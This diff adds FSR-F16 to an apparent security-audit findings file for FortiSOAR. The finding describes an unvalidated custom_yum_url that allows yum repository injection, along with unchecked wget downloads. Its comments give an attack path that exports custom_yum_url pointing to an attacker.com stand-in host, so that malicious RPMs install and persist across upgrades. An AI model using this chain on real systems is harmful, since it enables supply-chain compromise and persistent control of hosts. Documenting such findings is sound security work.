@@ -1098,3 +1098,65 @@ FSR_F15_PROD_HARDCODED_SECRETS = {
         "Confirm pg_hba.conf trust auth is still default in current versions once version-dir RPMs download."
     ),
 }
+
+# FSR-F16: setup-environment.bin custom_yum_url unvalidated env-var yum source injection
+# CVSS 3.1: AV:L/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H = 7.5 HIGH (with prior root/code-exec)
+# CWE-427: Uncontrolled Search Path Element
+# CWE-494: Download of Code Without Integrity Check
+#
+# Source: fortisoar/scripts/setup-environment.bin (Bash script, publicly distributed)
+# Also affected: stage-fortisoar-rpm-dependencies.bin (wget --no-check-certificate)
+#
+# setup-environment.bin reads the $custom_yum_url environment variable without validation
+# and writes it to /etc/yum/vars/product_yum_server, which is then used in yum -y update.
+# No URL format check, no allowlist, no GPG key validation for packages from the custom URL.
+#
+# custom_yum_repo() function:
+#   local f_product_yum_repo="/etc/yum/vars/product_yum_server"
+#   echo "$custom_yum_url" > $f_product_yum_repo  # no validation
+#   [then: yum -y update $s_rpms_to_upgrade from this repo]
+#
+# Attack path (requires prior code exec as root, e.g., FSR-F11 if cyops-worker = root):
+# 1. Set env: export custom_yum_url="http://attacker.com/repo/"
+# 2. Trigger upgrade via: /path/to/setup-environment.bin <target_version>
+# 3. yum installs from attacker-controlled repo, injecting malicious cyops RPMs
+# 4. Malicious RPMs persist across legitimate upgrades (pre-installed hook)
+#
+# stage-fortisoar-rpm-dependencies.bin: Uses wget --no-check-certificate for all downloads
+# from repo.fortisoar.fortinet.com. No GPG signature verification of downloaded RPMs.
+# MitM between FortiSOAR and repo server (expired cert, CA compromise, BGP hijack)
+# allows serving malicious RPMs that the staging script accepts silently.
+#
+# Internal path revealed: /opt/cyops/scripts/cloud/openstack/init-config.sh (FortiCloud)
+# FortiCloud metadata: /opt/cyops/configs/fcloud/metadata.json
+
+FSR_F16_YUM_SOURCE_INJECTION = {
+    "id": "FSR-F16",
+    "title": "setup-environment.bin unvalidated custom_yum_url allows yum source injection",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "cvss_vector": "AV:L/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H",
+    "cwe": ["CWE-427", "CWE-494"],
+    "component": "fortisoar/scripts/setup-environment.bin",
+    "source_file": "setup-environment.bin (Bash, publicly distributed)",
+
+    "injection_point": (
+        "$custom_yum_url environment variable written to /etc/yum/vars/product_yum_server "
+        "without URL validation or allowlist. Used in subsequent yum -y update call."
+    ),
+
+    "secondary": (
+        "stage-fortisoar-rpm-dependencies.bin uses wget --no-check-certificate for ALL downloads "
+        "from repo.fortisoar.fortinet.com. No RPM GPG signature verification. "
+        "Network MitM or DNS hijack of repo.fortisoar.fortinet.com (AWS us-west-2: 54.69.111.24) "
+        "allows malicious RPM injection without integrity check failure."
+    ),
+
+    "chain": (
+        "FSR-F11 (code exec as cyops-worker) -- if cyops-worker = root: "
+        "exec with custom_yum_url=attacker-url -> yum installs malicious cyops RPMs -> "
+        "persistence across future FortiSOAR upgrades via pre-installed package hooks."
+    ),
+
+    "prerequisite": "Root-level code exec (FSR-F11 if cyops-worker=root, or escalation from cyops-worker)",
+}
